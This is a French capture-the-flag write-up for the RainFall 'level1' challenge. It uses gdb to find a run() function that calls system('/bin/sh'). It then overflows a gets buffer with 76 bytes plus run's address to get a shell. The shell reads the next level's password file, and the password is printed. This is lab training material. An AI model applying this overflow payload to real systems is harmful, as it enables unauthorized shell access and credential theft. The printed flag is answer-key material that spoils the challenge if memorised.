@@ -1,0 +1,48 @@
+Le binaire ouvre un stream qui get notre input et le print a nouveau dans la sortie standare
+
+Avec gdb on utilisera info functions pour regarder ce qu'il y a
+0x080482f8  _init
+0x08048340  gets
+0x08048340  gets@plt
+0x08048350  fwrite
+0x08048350  fwrite@plt
+0x08048360  system
+0x08048360  system@plt
+0x08048370  __gmon_start__
+0x08048370  __gmon_start__@plt
+0x08048380  __libc_start_main
+0x08048380  __libc_start_main@plt
+0x08048390  _start
+0x080483c0  __do_global_dtors_aux
+0x08048420  frame_dummy
+0x08048444  run
+0x08048480  main
+0x080484a0  __libc_csu_init
+0x08048510  __libc_csu_fini
+0x08048512  __i686.get_pc_thunk.bx
+0x08048520  __do_global_ctors_aux
+0x0804854c  _fini
+
+Pour voir le disas. regarder le disas_analys
+
+Dans run on remarque system qui prend une string contenant /bin/sh et donc qui ouvre un sh.
+
+On va essayer de print l'addresse de run dans la zone ou segfault le programme. Pour ce faire on devra utiliser un nombre preci en terme de buffer + l'adresse a savoir que l'adresse = 4 bytes
+
+
+Dans le main on vois que la valeur 80 est sub a esp, esp est ici le param recuperer dans le stream. Donc on suppose que le param ne doit pas deppasser 80.
+
+level1@RainFall:~$ python -c 'print "o" * 80' > /tmp/run1
+level1@RainFall:~$ cat /tmp/run1 - | ./level1
+
+Segmentation fault (core dumped)
+
+Ca segfault. On va donc rajouter l'adresse. Mais comme elle est d'une valeur de 4 bytes on le prendra en compte dans notre attaque
+
+level1@RainFall:~$ python -c 'print "o" * 76 + "\x44\x84\x04\x08"' > /tmp/run1
+level1@RainFall:~$ cat /tmp/run1 - | ./level1
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
